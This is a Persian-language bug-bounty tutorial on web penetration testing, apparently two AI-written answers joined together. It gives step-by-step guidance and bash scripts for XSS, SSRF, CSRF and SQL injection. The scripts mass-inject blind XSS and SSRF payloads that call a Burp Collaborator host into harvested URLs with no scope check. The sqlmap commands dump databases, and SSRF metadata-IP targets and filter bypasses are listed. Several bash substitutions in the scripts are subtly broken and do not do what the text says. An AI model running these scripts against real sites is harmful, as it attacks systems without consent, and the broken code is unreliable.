با توجه به علاقه‌مندی شما به یادگیری و استفاده حرفه‌ای از ابزارهای تست نفوذ وب، در ادامه یک برنامه جامع و مرحله‌به‌مرحله برای هر بخش مهم (XSS، SSRF، CSRF) همراه با اسکریپت‌های تخصصی‌تر و راهنمای تصویری و منابع آموزشی فارسی معتبر ارائه می‌دهم. این برنامه به شما کمک می‌کند فرایند تست نفوذ وب را به بهترین شکل انجام دهید.

1. تست XSS (Cross-Site Scripting)
گام‌های اصلی
شناسایی ورودی‌های آسیب‌پذیر: فرم‌ها، پارامترهای URL، هدرها، کوکی‌ها

تزریق پیلودهای XSS: پیلودهای ساده مثل <script>alert(1)</script> و پیلودهای پیشرفته‌تر

استفاده از Burp Suite Intruder و Repeater برای ارسال و تست پیلودها

استفاده از Burp Collaborator برای شناسایی Blind XSS

تحلیل پاسخ‌ها و لاگ‌ها

نمونه اسکریپت اتوماتیک تزریق XSS با Burp Collaborator
```bash
#!/bin/bash
target=$1
collaborator="your-collaborator-id.burpcollaborator.net"

cat urls.txt | grep '=' | while read url; do
  payload="<script src='https://$collaborator'></script>"
  test_url="${url/=\*/=$payload}"
  curl -s "$test_url" > /dev/null
  echo "Injected payload to $test_url"
done
```
منابع تصویری و فارسی
آموزش کامل Burp Suite و تست XSS در لرن فایلز

ویدیو آموزش XSS با Burp Suite در آپارات

مقاله آموزش XSS با Burp Suite در سایفکس

2. تست SSRF (Server-Side Request Forgery)
گام‌های اصلی
شناسایی پارامترهای URL یا ورودی‌هایی که سرور درخواست HTTP ارسال می‌کند

تزریق آدرس‌های داخلی مثل http://127.0.0.1 یا دامنه Burp Collaborator

استفاده از Burp Collaborator برای شناسایی درخواست‌های ارسالی از سرور

تست دور زدن فیلترها با قالب‌های مختلف آدرس

نمونه پیلود SSRF ساده
```bash
http://target.com/api?url=http://your-collaborator-id.burpcollaborator.net
```
منابع آموزشی
آموزش تست SSRF در PortSwigger

مقاله فارسی آموزش SSRF در سایت امنیتی سایفکس

3. تست CSRF (Cross-Site Request Forgery)
گام‌های اصلی
شناسایی درخواست‌های حساس POST یا GET

حذف یا تغییر هدرهای Origin و Referer و تست واکنش سرور

بررسی وجود توکن CSRF و اعتبارسنجی آن

استفاده از Burp Suite Intruder برای حذف یا تغییر توکن‌ها و بررسی پاسخ

راهنمای تصویری
آموزش تست CSRF با Burp Suite در آپارات (نمونه ویدیویی)

مقاله فارسی تست CSRF در فرادرس

4. راهنمای گام‌به‌گام استفاده پیشرفته Burp Suite
نصب و پیکربندی Proxy و گواهی SSL

استفاده از Repeater برای تست‌های دستی

Intruder برای حملات خودکار و فازی

Collaborator برای تست آسیب‌پذیری‌های Out-of-Band مثل Blind XSS و SSRF

Extender برای افزودن افزونه‌های تخصصی مثل SQLiPy (ادغام SQLMap)

Sequencer برای تحلیل امنیت توکن‌ها

Comparer برای مقایسه درخواست‌ها و پاسخ‌ها

منابع آموزش
دوره ویدیویی کامل Burp Suite در لرن فایلز

مقاله گام‌به‌گام Burp Suite در سایت APK

آموزش افزونه SQLiPy برای ادغام Burp و SQLMap

5. راهنمای گام‌به‌گام استفاده پیشرفته SQLMap
اجرای تست SQLi روی پارامترهای GET و POST

استفاده از گزینه‌های پیشرفته --level, --risk, --technique

بهره‌برداری از دیتابیس و استخراج داده‌ها

اجرای دستورات سیستم عامل در صورت امکان

استفاده از API SQLMap با افزونه SQLiPy در Burp Suite

نمونه دستور پیشرفته
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch --level=5 --risk=3 --dump --threads=10 --random-agent
```
منابع آموزشی
آموزش کامل SQLMap در PentestCore

ویدیو آموزش SQLMap در آپارات

6. اسکریپت ترکیبی پیشرفته برای XSS، SSRF و SQLi
```bash
#!/bin/bash

target=$1
collaborator="your-collaborator-id.burpcollaborator.net"

# زیردامنه‌ها
subfinder -d $target -silent > subdomains.txt

# دامنه‌های زنده
cat subdomains.txt | httpx -silent -threads 50 > live_domains.txt

# استخراج URLها
cat live_domains.txt | waybackurls | sort -u > urls.txt

# تزریق XSS
grep '=' urls.txt | while read url; do
  xss_payload="<script src='https://$collaborator'></script>"
  test_url="${url/=\*/=$xss_payload}"
  curl -s "$test_url" > /dev/null
done

# تست SSRF
grep -E 'url=|redirect=' urls.txt | while read url; do
  ssrf_payload="http://$collaborator"
  test_url="${url/=(*)/=$ssrf_payload}"
  curl -s "$test_url" > /dev/null
done

# تست SQLi با SQLMap
grep '=' urls.txt | while read url; do
  sqlmap -u "$url" --batch --level=3 --risk=2 --threads=10 --random-agent --output-dir=./sqlmap_output
done
```


======================================================================================================

با توجه به هدف شما برای کسب درآمد از باگ بانتی و نیاز به آموزش‌های جامع و عملی، این راهنما به صورت جداگانه برای هر آسیب‌پذیری اصلی (XSS، SSRF، CSRF) با جزئیات بیشتر، اسکریپت‌های تخصصی و معرفی منابع آموزشی فارسی و ویدیویی معتبر ارائه می‌شود. این رویکرد به شما کمک می‌کند فرایند تست نفوذ وب را به بهترین شکل ممکن انجام دهید و در نهایت به درآمد برسید.

رویکرد کلی برای Bug Bounty
برای موفقیت در باگ بانتی، باید فرایندها را تا حد امکان اتوماتیک کنید و از فاز Recon به بهترین شکل بهره ببرید، زیرا 80 درصد پیدا کردن باگ در این فاز است .

1. تست XSS (Cross-Site Scripting)
جزئیات آسیب‌پذیری
XSS زمانی رخ می‌دهد که مهاجم بتواند کدهای مخرب (معمولاً JavaScript) را به یک صفحه وب تزریق کند و این کد در مرورگر کاربران دیگر اجرا شود. انواع اصلی XSS شامل Stored XSS, Reflected XSS و DOM-based XSS هستند. برای باگ بانتی، تمرکز بر روی Blind XSS (نوعی Stored XSS که در پنل‌های ادمین یا لاگ‌ها ظاهر می‌شود) بسیار موثر است.

اسکریپت‌های تخصصی و راهنمای عملی
استفاده از subfinder و httpx برای شناسایی دامنه‌های زنده:
```bash
subfinder -d example.com | httpx -silent > live_domains.txt
```
این کار تمام زیردامنه‌های زنده را لیست می‌کند.

استخراج URLها و پارامترها با waybackurls:
```bash
cat live_domains.txt | waybackurls > urls.txt
```
این مرحله به شما کمک می‌کند تا تمامی نقاط ورودی احتمالی برای تزریق پیلود را پیدا کنید.

تزریق پیلودهای XSS با استفاده از Burp Collaborator (برای Blind XSS):

پیکربندی Burp Collaborator: در Burp Suite، به تب "Burp Collaborator client" بروید و یک ID جدید ایجاد کنید. این ID مانند یک URL عمل می‌کند (مثلاً your-random-id.burpcollaborator.net).

```bash
پیلود: <script src='https://your-random-id.burpcollaborator.net'></script>
```
اسکریپت تزریق:

```bash
#!/bin/bash
collaborator_id="your-random-id.burpcollaborator.net"
input_file="urls.txt" # فایل حاوی لیست URL ها

while read url; do
    # ساخت پیلود XSS برای پارامترهای GET
    if [[ "$url" == *'='* ]]; then
        xss_payload="<script src='https://${collaborator_id}/'></script>"
        encoded_xss_payload=$(printf %s "$xss_payload" | jq -sRr @uri) # URL-encode the payload
        test_url="${url//=(*)/=${encoded_xss_payload}}" # Replace current parameter value
        echo "Testing XSS on: $test_url"
        curl -s -k "$test_url" > /dev/null & # -k for insecure SSL, & for background
    fi

    # همچنین می‌توان پیلودها را در هدرها، کوکی‌ها و فیلدهای POST تزریق کرد
    # برای فیلدهای POST نیاز به بررسی دستی یا استفاده از Burp Intruder است.
done < "$input_file"

echo "Check Burp Collaborator client for hits."
```
پس از اجرای این اسکریپت، پنل Burp Collaborator را بررسی کنید. هرگاه پیلود شما در سمت سرور (مثلاً توسط ادمین) اجرا شود، در Burp Collaborator ثبت می‌شود.

منابع آموزشی برای XSS
آموزش JavaScript برای هکرها: یادگیری JavaScript برای باگ بانتی بسیار ضروری است، زیرا بسیاری از آسیب‌پذیری‌های XSS و DOM-based XSS با JavaScript سروکار دارند .

دوره‌های جامع تست نفوذ وب: دوره‌هایی مانند SANS SEC 542 و SANS SEC 642 که در لرن فایلز ارائه شده‌اند، مفاهیم پایه و پیشرفته XSS را پوشش می‌دهند و سناریوهای عملی ارائه می‌کنند .

OWASP Top 10: همیشه مرجع اصلی آسیب‌پذیری‌های وب از جمله XSS است.

2. تست SSRF (Server-Side Request Forgery)
جزئیات آسیب‌پذیری
SSRF به مهاجم اجازه می‌دهد تا سرور وب را مجبور کند درخواست‌های HTTP یا سایر پروتکل‌ها را به آدرس‌های دلخواه مهاجم (مانند منابع داخلی شبکه، localhost یا سرویس‌های ابری) ارسال کند. این آسیب‌پذیری اغلب منجر به افشای اطلاعات حساس یا دسترسی به سیستم‌های داخلی می‌شود.

اسکریپت‌های تخصصی و راهنمای عملی
شناسایی نقاط ورود: به دنبال پارامترهایی در URL یا بدنه درخواست باشید که آدرس URL دریافت می‌کنند (مثلاً callback, url, image_url, webhook_url).

تزریق آدرس Burp Collaborator: مشابه XSS، از آدرس Burp Collaborator برای تشخیص SSRF کور (Blind SSRF) استفاده کنید.

پیلود: http://your-random-id.burpcollaborator.net/ یا https://your-random-id.burpcollaborator.net/

اسکریپت تزریق:

```bash
#!/bin/bash
collaborator_id="your-random-id.burpcollaborator.net"
input_file="urls.txt" # فایل حاوی لیست URL ها
ssrf_payload="http://${collaborator_id}/"

while read url; do
    if [[ "$url" == *'='* ]]; then
        # تلاش برای تزریق در پارامترهای مختلف
        encoded_ssrf_payload=$(printf %s "$ssrf_payload" | jq -sRr @uri)
        test_url="${url//=(*)/=${encoded_ssrf_payload}}"
        echo "Testing SSRF on: $test_url"
        curl -s -k "$test_url" > /dev/null &
    fi
done < "$input_file"

echo "Check Burp Collaborator client for hits."
```
تزریق آدرس‌های داخلی: اگر SSRF مستقیم باشد، می‌توانید IPهای داخلی (مانند 127.0.0.1, 192.168.1.1 یا آدرس‌های AWS 169.254.169.254 برای Metdata Service) را تزریق کنید و پاسخ سرور را تحلیل کنید.

تست دور زدن فیلترها: از روش‌های مختلف Encode کردن URL، استفاده از IPهای عددی، یا // برای دور زدن فیلترهای http:// استفاده کنید.

منابع آموزشی برای SSRF
دوره‌های تست نفوذ وب که به صورت جامع SSRF را پوشش می‌دهند .

مستندات PortSwigger درباره SSRF (به زبان انگلیسی).

3. تست CSRF (Cross-Site Request Forgery)
جزئیات آسیب‌پذیری
CSRF به مهاجم اجازه می‌دهد تا کاربر احراز هویت شده را مجبور کند تا یک درخواست ناخواسته (مانند تغییر رمز عبور، انتقال وجه) را به برنامه وب ارسال کند. این حمله اغلب با استفاده از توکن‌های ضد-CSRF یا اعتبارسنجی Origin/Referer محافظت می‌شود.

اسکریپت‌های تخصصی و راهنمای عملی
شناسایی درخواست‌های حساس: تمام درخواست‌های POST یا GET که وضعیت برنامه را تغییر می‌دهند (تغییر رمز، حذف اکانت، انتقال پول) را شناسایی کنید.

استفاده از Burp Suite برای تحلیل و تولید POC:

رهگیری درخواست: درخواست حساس را در Burp Proxy رهگیری کنید.

تولید POC (Proof of Concept): در Burp Suite، روی درخواست راست کلیک کرده و "Engagement tools" -> "Generate CSRF PoC" را انتخاب کنید.

تغییر و حذف توکن‌ها/هدرها:

حذف توکن CSRF: در فرم تولید شده، توکن CSRF را حذف کنید.

حذف یا تغییر هدر Referer: در Burp Repeater، درخواست را ارسال کنید و هدر Referer یا Origin را حذف کنید. اگر درخواست بدون این هدرها یا با هدرهای جعلی موفق باشد، آسیب‌پذیری وجود دارد.

تست در مرورگر قربانی: فایل HTML تولید شده را در یک مرورگر دیگر باز کنید (جایی که کاربر احراز هویت شده است). اگر درخواست بدون اطلاع کاربر ارسال شود، آسیب‌پذیری CSRF وجود دارد.

منابع آموزشی برای CSRF
دوره‌های تست نفوذ وب .

OWASP Top 10 (CSRF یکی از آسیب‌پذیری‌های رایج است).

مستندات PortSwigger درباره CSRF.

منابع آموزشی کلی برای باگ بانتی و تست نفوذ وب
دوره‌های جامع تست نفوذ وب (Web Hacking): دوره‌هایی مانند SANS SEC 542 و SANS SEC 642 که در لرن فایلز ارائه شده‌اند . این دوره‌ها شامل سناریوهای عملی و پروژه محور روی تارگت‌های قانونی هستند و مفاهیم کلیدی باگ بانتی را آموزش می‌دهند.

کتاب‌ها و دوره‌های اتوماتیک‌سازی با پایتون: برای سریع‌تر شدن در باگ بانتی، اتوماتیک‌سازی فرآیندها با پایتون بسیار مهم است .

دوره‌های باگ بانتی رایگان: پلتفرم‌هایی مانند One Nice Life دوره‌های رایگان جامع تست نفوذ وب و باگ بانتی ارائه می‌دهند .

انجمن‌ها و کامیونیتی‌های باگ بانتی: شرکت در چالش‌ها و لابراتوارها، و ارتباط با متخصصان می‌تواند به شما کمک کند مشکلات خود را حل کنید و مهارت‌هایتان را افزایش دهید .

کانال‌های YouTube و آپارات: بسیاری از متخصصان تست نفوذ در این پلتفرم‌ها آموزش‌های ویدیویی عملی ارائه می‌دهند .

نکته کلیدی برای درآمدزایی در باگ بانتی:
فاز Recon (جمع‌آوری اطلاعات) 80 درصد موفقیت شما را تشکیل می‌دهد . هرچه در این فاز بهتر عمل کنید و دامنه‌ها و نقاط ورودی بیشتری را شناسایی کنید، شانس شما برای یافتن آسیب‌پذیری افزایش می‌یابد. استفاده از ابزارهای اتوماتیک و اسکریپت‌های پایتون برای این فاز بسیار مهم است .

با تمرین مداوم روی پلتفرم‌های قانونی و شرکت در چالش‌های واقعی، می‌توانید مهارت‌های خود را ارتقا داده و به درآمد برسید.
